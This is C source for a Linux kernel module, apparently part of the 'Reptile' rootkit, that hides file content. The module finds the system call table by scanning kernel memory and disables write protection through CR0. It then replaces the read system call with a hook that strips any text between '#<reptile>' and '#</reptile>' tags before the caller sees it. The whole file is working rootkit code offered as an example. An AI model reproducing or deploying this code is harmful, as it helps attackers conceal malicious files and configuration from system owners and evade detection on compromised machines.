#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/module.h> 
#include <linux/syscalls.h>
#include <asm/pgtable.h>

#define SSIZE_MAX 32767
#define HIDETAGIN "#<reptile>"
#define HIDETAGOUT "#</reptile>"

atomic_t read_a;
static unsigned long *sct;
asmlinkage ssize_t (*o_read)(int fd, void *buf, size_t nbytes);
asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes);

struct file *e_fget_light(unsigned int fd, int *fput_needed) {
    struct file *file;
    struct files_struct *files = current->files;

    *fput_needed = 0;
    if (likely((atomic_read(&files->count) == 1))) {
        file = fcheck(fd);
    } else {
        spin_lock(&files->file_lock);
        file = fcheck(fd);
        if (file) {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);
    }
    return file;
}

int f_check(void *arg, int size) {
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);

	buf = (char *) kmalloc(size+1, GFP_KERNEL);
	if(__copy_from_user((void *) buf, (void *) arg, size)) goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return(1);
	}
out:
	kfree(buf);
	return(-1);
}

int hide_content(void *arg, int size) {
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *) kmalloc(size, GFP_KERNEL);
	if(__copy_from_user((void *) buf, (void *) arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	i = size - (p2 - buf);
	memmove((void *) p1, (void *) p2, i);
	newret = size - (p2 - p1);

	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
		kfree(buf);
		return size;
	}
	kfree(buf);
	return newret;
}

asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
	struct file *f;
	int fput_needed;
	ssize_t ret = -EBADF;

	atomic_set(&read_a, 1);
	f = e_fget_light(fd, &fput_needed);

	if (f) {
		ret = vfs_read(f, buf, nbytes, &f->f_pos);

		if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
	    	
		fput_light(f, fput_needed);
	}
	atomic_set(&read_a, 0);
	return ret;
}

unsigned long *find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

static int __init sys_call_hijack_module(void) { 

	printk("\e[01;36mSYS_CALL_HIJACK EXAMPLE \e[01;31mwritten by F0rb1dd3n\e[00m\n");
	printk("LOADING...\n");

	sct = (unsigned long *)find_sys_call_table();
	
	if(sct) {
		printk("SYS_CALL_TABLE found at: %lx\n", *sct); 
	
    		o_read = (void *)sct[__NR_read];
		
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_read] = (unsigned long)l33t_read;		
		write_cr0(read_cr0() | 0x10000);

		printk("sys_read hooked!!! ;)\n");
	} else {
		printk("sys_call_table not found\n");
		return -1;
	}
	return 0; 
} 

static void __exit bye_module(void) { 
	if (o_read) {
		printk("Restoring the sys_call_table... ");
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_read] = (unsigned long)o_read;
		write_cr0(read_cr0() | 0x10000);
		printk("\e[01;36mOK\e[00m\n");
    	}
	printk("Good bye kernel!\n"); 
}

module_init(sys_call_hijack_module);
module_exit(bye_module);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("F0rb1dd3n - ighor@intruder-security.com");
MODULE_DESCRIPTION("An exemple of hiding file content");
